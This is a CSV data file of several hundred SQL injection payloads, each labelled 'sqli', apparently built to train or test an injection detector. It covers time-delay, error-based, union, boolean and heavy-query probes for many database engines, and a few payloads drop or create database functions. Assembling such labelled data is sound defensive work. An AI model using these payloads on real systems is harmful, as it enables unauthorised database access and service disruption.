"pattern","type"
"1%')));call regexp_substring(repeat(right(char(2385),0),500000000),null)--","sqli"
"1')) as kgiw where 7452=7452 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","sqli"
"1"") union all select null--","sqli"
"1')) as ngoo where 8641=8641 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","sqli"
"1') and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ('cfzp' like 'cfzp","sqli"
"1') and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--","sqli"
"1' (select basp where 6953=6953;iif(5257=5257,1,1/0)","sqli"
"1"")) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((""rqxd""=""rqxd","sqli"
"1%"")) or (select * from (select(sleep(5)))ydpu) and ((""%""=""","sqli"
"-9505'))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('qhdg'='qhdg","sqli"
"1');call regexp_substring(repeat(right(char(3702),0),500000000),null) and ('ahjo'='ahjo","sqli"
"-9764' where 1266=1266 or elt(4069=6162,6162)--","sqli"
"-4045 union all select 6857,6857,6857,6857,6857,6857,6857--","sqli"
"1') as qcse where 4147=4147 waitfor delay '0:0:5'--","sqli"
"1%"") and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (""%""=""","sqli"
"1""))) and 3824=benchmark(5000000,md5(0x76555642)) and (((""enfu""=""enfu","sqli"
"1%') and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ('%'='","sqli"
"1'||(select 'miew' where 8360=8360 waitfor delay '0:0:5')||'","sqli"
"1)) as ewlg where 3722=3722 rlike sleep(5)--","sqli"
"1')) union all select null,null,null,null,null,null#","sqli"
"1' where 5458=5458 rlike (select * from (select(sleep(5)))vwyq)#","sqli"
"(select (case when (6461=1802) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)","sqli"
"-6433%')) or 9323=9323#","sqli"
"1' in boolean mode) union all select null,null--","sqli"
"1'))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ((('fbsi' like 'fbsi","sqli"
"1%'));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--","sqli"
"-4023 or (8779=5716)*5716","sqli"
"1' in boolean mode) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","sqli"
"1') and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ('jhlj'='jhlj","sqli"
"1%' or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and '%'='","sqli"
"-2223')) as mjwp where 8650=8650 or 7900=5838","sqli"
"-8200%"")) union all select 7538,7538,7538#","sqli"
"1%' union all select null,null,null,null,null,null,null,null,null,null--","sqli"
"-7122"") union all select 4002,4002,4002,4002,4002,4002,4002,4002#","sqli"
"1""))) or 8421=(select count(*) from generate_series(1,5000000)) and (((""ugtw""=""ugtw","sqli"
"1') or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ('cysu' like 'cysu","sqli"
"1"")));(select * from (select(sleep(5)))srmq) and (((""sxih""=""sxih","sqli"
"1) where 8734=8734 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#","sqli"
"-8911%' or 9323=9323#","sqli"
"-3749"" or elt(1032=1032,3623) and ""mzrw""=""mzrw","sqli"
"-1351"" where 6968=6968 or 5684=8582","sqli"
"1%'));select count(*) from generate_series(1,5000000) and (('%'='","sqli"
"1"" and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ""xhvo""=""xhvo","sqli"
"1;call regexp_substring(repeat(right(char(3702),0),500000000),null)# huhw","sqli"
"1'||(select 'ovlx' where 8767=8767 or sleep(5))||'","sqli"
"1"")));(select * from (select(sleep(5)))srmq) and (((""eakt"" like ""eakt","sqli"
"-2733'))) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('btjx'='btjx","sqli"
"1"")) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((""ghdr"" like ""ghdr","sqli"
"1)) and 3824=benchmark(5000000,md5(0x76555642)) and ((8280=8280","sqli"
"1'||(select 'zqdn' where 6194=6194 union all select null,null,null,null--","sqli"
"-5026' where 7324=7324 union all select 7324,7324--","sqli"
"1'||(select 'gnil' from dual where 7552=7552 rlike (select (case when (7689=7689) then 1 else 0x28 end)))||'","sqli"
"1')) and 8594=(select 8594 from pg_sleep(5))--","sqli"
"-5934' union all select 6096,6096,6096,6096,6096#","sqli"
"1) as qwsa where 2874=2874;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--","sqli"
"-2759%"")) or 7769=1249#","sqli"
"-9163"" union all select 3820,3820,3820,3820,3820,3820,3820,3820,3820#","sqli"
"1) where 3936=3936;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--","sqli"
"-5849) union all select 6168,6168,6168,6168,6168,6168,6168,6168#","sqli"
"-8487') where 9655=9655 union all select 9655,9655,9655,9655,9655,9655,9655,9655,9655,9655--","sqli"
"1')) as wjfj where 3802=3802;if(8574=7534) select 8574 else drop function nxbe--","sqli"
"1"") where 3122=3122 and sleep(5)#","sqli"
"1);select benchmark(5000000,md5(0x4c4d6142))","sqli"
"1);create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (1435=1435","sqli"
"1')));(select * from (select(sleep(5)))srmq) and ((('ksoc'='ksoc","sqli"
"-1687)) as lnva where 8396=8396 union all select 8396,8396#","sqli"
"-9562' or 8571=8571--","sqli"
"1 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))-- slje","sqli"
"1"") or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""rkfk"" like ""rkfk","sqli"
"1' in boolean mode) union all select null,null,null,null#","sqli"
"-1332) as qtbb where 7261=7261 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#","sqli"
"-8981%""))) union all select 4538,4538,4538,4538,4538,4538,4538#","sqli"
"1%' union all select null,null,null--","sqli"
"1%')) or elt(5873=5873,sleep(5))#","sqli"
"1'))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (('rbhe'='rbhe","sqli"
"1' (select zpns where 6922=6922 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)) '","sqli"
"-5630"") or 3038=3038","sqli"
"1));select case when 8237=9948 then 1 else null end--","sqli"
"1%""))) union all select null,null,null#","sqli"
"-9558"" where 7497=7497 or (2539=6484)*6484--","sqli"
"1"")) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((""rtyu"" like ""rtyu","sqli"
"1) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))","sqli"
"1"" and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)","sqli"
"-6945' union all select 5063,5063,5063,5063,5063,5063,5063,5063--","sqli"
"-8828%'))) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('%'='","sqli"
"1') as woka where 4316=4316 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","sqli"
"1 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)-- mtaq","sqli"
"1%') and 8734=5844","sqli"
"-3501') or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('spvx'='spvx","sqli"
"1""))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (((""ftjg""=""ftjg","sqli"
"1');begin user_lock.sleep(5); end and ('nchh'='nchh","sqli"
"-7859) as ipdg where 4413=4413 or 9323=9323#","sqli"
"1"")) as ogzn where 6849=6849 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","sqli"
"1"" and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ""rntg"" like ""rntg","sqli"
"-5738"") as efbn where 8541=8541 union all select 8541,8541,8541,8541,8541,8541,8541,8541#","sqli"
"1 where 8578=8578 and 4770=4474--","sqli"
"1"")) as nwnp where 6140=6140;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--","sqli"
"1,(case when 6620=3092 then 1 else null end)","sqli"
"1) where 5336=5336 union all select null,null,null,null,null,null,null,null,null,null#","sqli"
"1;select case when 2599=7035 then 1 else null end--","sqli"
"1'))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('tzbp'='tzbp","sqli"
"1';begin user_lock.sleep(5); end and 'hizd'='hizd","sqli"
"1,(select 2*(if((select * from (select concat(0x7171706a71,(select (elt(9693=9693,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))","sqli"
"-8698"" where 1990=1990 or (8459=8459)*4906--","sqli"
"1%"")) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ((""%""=""","sqli"
"1) where 1513=1513 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--","sqli"
"1' in boolean mode) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--","sqli"
"1%') or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","sqli"
"-7580')) as mmqt where 3468=3468 union all select 3468,3468,3468,3468,3468,3468#","sqli"
"-7532))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((8332=8332","sqli"
"1'||(select 'lmsc' from dual where 1162=1162 order by 1--","sqli"
"-2718"" or 2724 in ((char(113) char(113) char(112) char(106) char(113) (select (case when (2724=2724) then char(49) else char(48) end)) char(113) char(122) char(118) char(122) char(113))) and ""xwbf""=""xwbf","sqli"
"1) union all select null,null,null,null,null,null#","sqli"
"1)) union all select null,null,null,null,null,null--","sqli"
"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--","sqli"
"-9941 union all select 1321,1321,1321,1321,1321,1321,1321#","sqli"
"1%"")));select (case when (3855=3855) then 3855 else 1/(select 0) end)--","sqli"
"1%')) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('%'='","sqli"
"1%'))) and make_set(8403=8403,8899) and ((('%'='","sqli"
"1"" or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","sqli"
"-3211)) as fsej where 6348=6348 or 9805=3783--","sqli"
"1"" where 5333=5333 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--","sqli"
"1') as qaec where 6572=6572 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","sqli"
"1%');call regexp_substring(repeat(right(char(3702),0),500000000),null) and ('%'='","sqli"
"1%"")) or 8514=benchmark(5000000,md5(0x544d5a4c))#","sqli"
"1' (select 'vedi' where 2774=2774 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","sqli"
"1',(select (case when (6948=4654) then 1 else 6948*(select 6948 from mysql.db) end))","sqli"
"-7187' or 4159=7465","sqli"
"-1076 union all select 3959,3959--","sqli"
"-5963"" or 9323=9323#","sqli"
"-5258) or (8459=8459)*4906","sqli"
"1"")) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((""kvpy""=""kvpy","sqli"
"1') where 9544=9544 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--","sqli"
"1' in boolean mode) union all select null,null,null,null,null,null,null,null--","sqli"
"1"" where 9135=9135 and elt(4249=4249,7259)--","sqli"
"1))) and 9575=1640--","sqli"
"1))) and elt(3132=1541,1541) and (((4258=4258","sqli"
"1'||(select 'oxam' from dual where 7162=7162 and make_set(8403=8403,8899))||'","sqli"
"-7744""))) union all select 9408,9408,9408,9408--","sqli"
"1';select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--","sqli"
"1') where 8118=8118;select benchmark(5000000,md5(0x714e4153))#","sqli"
"1""))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((""jmjr"" like ""jmjr","sqli"
"1%')))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((('%'='","sqli"
"1%' and 9127=7687--","sqli"
"1"") or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (""mhfc""=""mhfc","sqli"
"1%""))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (((""%""=""","sqli"
"1%""))) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","sqli"
"-2803"") union all select 5337,5337,5337,5337,5337,5337,5337#","sqli"
"1'))) and sleep(5) and ((('lbmp'='lbmp","sqli"
"-8655) where 3910=3910 union all select 3910,3910#","sqli"
"1');select benchmark(5000000,md5(0x4c4d6142)) and ('nslo' like 'nslo","sqli"
"1')) as rxhe where 3838=3838 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","sqli"
"1')) as agdn where 8442=8442 and 3824=benchmark(5000000,md5(0x76555642))--","sqli"
"-2296"" union all select 7359,7359,7359,7359,7359,7359#","sqli"
"1' (select qtyi where 7147=7147;select count(*) from generate_series(1,5000000)--","sqli"
"-5769) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')","sqli"
"1';if(7899=7899) select 7899 else drop function zbbp--","sqli"
"1')))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((('bvdw'='bvdw","sqli"
"1 where 6040=6040 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","sqli"
"1'))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (('dpdz' like 'dpdz","sqli"
"1') and elt(1407=6365,6365) and ('zckl'='zckl","sqli"
"-2276"")) as qwow where 2321=2321 or 3534=2971--","sqli"
"-6639') as trll where 6271=6271 union all select 6271,6271,6271#","sqli"
"1"" where 3227=3227 waitfor delay '0:0:5'--","sqli"
"1"")) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((""ozvp""=""ozvp","sqli"
"1')) and elt(1210=1210,sleep(5)) and (('ogpg'='ogpg","sqli"
"1) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","sqli"
"1"") and 9198=9198--","sqli"
"1;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg","sqli"
"-2761 or 1144=7657-- mfml","sqli"
"1"") and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","sqli"
"1"";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""mpxd"" like ""mpxd","sqli"
"1 where 3478=3478 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--","sqli"
"1%')) or (select * from (select(sleep(5)))sddo)#","sqli"
"1',(select (case when (8640=8640) then (ascii(regexp_substring(repeat(right(char(8640),0),500000000),null))) else 8640/(select 0 from information_schema.system_users) end) from information_schema.system_users)--","sqli"
"1%' or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and '%'='","sqli"
"1' rlike (select (case when (5384=7060) then 1 else 0x28 end))","sqli"
"1"";select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--","sqli"
"-8924)) as jybr where 7901=7901 or elt(1032=1032,3623)--","sqli"
"1) and (3020=3020)*6703","sqli"
"1 rlike sleep(5)# urxh","sqli"
"1%')));select (case when (5752=6036) then 1 else 5752*(select 5752 from master..sysdatabases) end)--","sqli"
"1' and 9970=3409","sqli"
"1""));select (case when (3499=4209) then 3499 else 3499*(select 3499 from mysql.db) end)#","sqli"
"1' (select rdwb where 2498=2498 and 3429=7639--","sqli"
"1' (select zwsr where 6567=6567;select pg_sleep(5)) '","sqli"
"-7796') union all select 4960,4960,4960,4960,4960,4960,4960,4960,4960,4960#","sqli"
"-6970"")) or 1570=convert(int,(select char(113) char(113) char(112) char(106) char(113) (select (case when (1570=1570) then char(49) else char(48) end)) char(113) char(122) char(118) char(122) char(113))) and ((""dyrq"" like ""dyrq","sqli"
"1) as kjsd where 1670=1670 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","sqli"
"1"" and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ""uvvy"" like ""uvvy","sqli"
"1) where 5261=5261 and elt(1210=1210,sleep(5))--","sqli"
"1'));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('yaml'='yaml","sqli"
"1"")) and 7533=7533 and ((""rnni"" like ""rnni","sqli"
"1""));iif(8770=9611,1,1/0)","sqli"
"1%"" or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ""%""=""","sqli"
"1) as cfnz where 6065=6065 union all select null,null,null,null,null,null,null,null,null#","sqli"
"-6122'))) or 9243=6161--","sqli"
"1%"")(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (""%""=""","sqli"
"1 where 4968=4968 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--","sqli"
"-5606) union all select 7118,7118,7118,7118,7118,7118,7118,7118,7118#","sqli"
"1 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)-- btqa","sqli"
"1'||(select 'ywjy' where 7579=7579;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","sqli"
"-3228"") or (5901=1570)*1570 and (""egdd""=""egdd","sqli"
"1) rlike sleep(5)#","sqli"
"1%' and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and '%'='","sqli"
"1)) as qgok where 3993=3993 and 3824=benchmark(5000000,md5(0x76555642))--","sqli"
"1%""))) and 7533=7533 and (((""%""=""","sqli"
"1)) and make_set(8403=8403,8899) and ((4686=4686","sqli"
"1' (select uqdb where 3508=3508 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","sqli"
"1%')) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('%'='","sqli"
"-3566%' or 2158=6289","sqli"
"1"")) and 4241=convert(int,(select char(113) char(113) char(112) char(106) char(113) (select (case when (4241=4241) then char(49) else char(48) end)) char(113) char(122) char(118) char(122) char(113))) and ((""bxcb"" like ""bxcb","sqli"
"1"")) and 6969=(select 6969 from pg_sleep(5)) and ((""nepk""=""nepk","sqli"
"1%""))) union all select null#","sqli"
"-9405' union all select 2539--","sqli"
"1%"";select sleep(5)#","sqli"
"-8791""))) or make_set(6681=6620,6620) and (((""pvdk""=""pvdk","sqli"
"-1988 where 4597=4597 union all select 4597,4597,4597,4597,4597,4597--","sqli"
"1"") as nyui where 2511=2511;iif(5257=5257,1,1/0)","sqli"
"1%"") or sleep(5)#","sqli"
"-3626%"") or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (""%""=""","sqli"
"1' and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and 'ulep'='ulep","sqli"
"1');select like('abcdefg',upper(hex(randomblob(500000000/2))))","sqli"
"1'||(select 'cqjw' from dual where 7335=7335 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))||'","sqli"
"1');select case when 7717=7717 then 1 else null end--","sqli"
"1"" and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)","sqli"
"-3954')) union all select 2417,2417--","sqli"
"1"" rlike (select * from (select(sleep(5)))sgvo) and ""wcze""=""wcze","sqli"
"-5910%'))) union all select 5184,5184,5184,5184,5184,5184,5184,5184,5184,5184--","sqli"
"1' where 9544=9544;(select * from (select(sleep(5)))acdk)#","sqli"
"-8112'))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('xopg'='xopg","sqli"
"1')) as qwdh where 7581=7581 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","sqli"
"1%""))) and 3824=benchmark(5000000,md5(0x76555642)) and (((""%""=""","sqli"
"1%') or elt(5873=5873,sleep(5))#","sqli"
"1)) as uadn where 9588=9588 rlike sleep(5)#","sqli"
"1""))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (((""tzqk"" like ""tzqk","sqli"
"1')) or 6793=(select 6793 from pg_sleep(5)) and (('qiau'='qiau","sqli"
"1' (select xzvf where 9727=9727;(select * from (select(sleep(5)))acdk)#","sqli"
"1"" or sleep(5) and ""telb""=""telb","sqli"
"1';select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3","sqli"
"1"")) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((""lano""=""lano","sqli"
"1'||(select 'ttyt' where 3751=3751 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","sqli"
"1"")) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((""uzbl""=""uzbl","sqli"
"1' and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and 'rpiz' like 'rpiz","sqli"
"1"") where 3390=3390;call regexp_substring(repeat(right(char(3702),0),500000000),null)--","sqli"
"1%"";select (case when (3855=3855) then 3855 else 1/(select 0) end)--","sqli"
"1%';select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and '%'='","sqli"
"1%') or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--","sqli"
"1' (select ijck where 9961=9961 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))) '","sqli"
"-3044') or 4999=3051#","sqli"
"1 where 5401=5401 and elt(1210=1210,sleep(5))--","sqli"
"1')));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ((('jutx'='jutx","sqli"
"1 and (select * from (select(sleep(5)))fzno)# bkjl","sqli"
"1) as amgf where 4308=4308 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--","sqli"
"-2896')) as wisk where 1030=1030 union all select 1030,1030,1030,1030#","sqli"
"1 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)-- ztzu","sqli"
"1 where 6036=6036 and 7533=7533--","sqli"
"-9445) as dmur where 4371=4371 union all select 4371,4371,4371,4371,4371,4371,4371,4371,4371,4371#","sqli"
"1%"")));select case when 7717=7717 then 1 else null end--","sqli"
"1)) as wwys where 9248=9248;(select * from (select(sleep(5)))srmq)--","sqli"
"1'||(select 'kitk' where 6311=6311;select * from generate_series(8147,8147,case when (8147=6336) then 1 else 0 end) limit 1--","sqli"
"1%')) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('%'='","sqli"
"1%'));select (case when (7594=8086) then 7594 else 1/(select 0) end)--","sqli"
"1')) rlike (select (case when (8489=8820) then 1 else 0x28 end)) and (('fbjf'='fbjf","sqli"
"-9810') where 4361=4361 or elt(1032=1032,3623)--","sqli"
"1'||(select 'xuof' from dual where 8794=8794 or 8156=(select count(*) from generate_series(1,5000000))--","sqli"
"1' (select 'zkum' where 5161=5161 union all select null,null,null,null#","sqli"
"1' and 2006=2006","sqli"
"(select (case when (6986=6986) then 6986 else 6986*(select 6986 from mysql.db) end))","sqli"
"1) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (3530=3530","sqli"
"1')));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('vwxg'='vwxg","sqli"
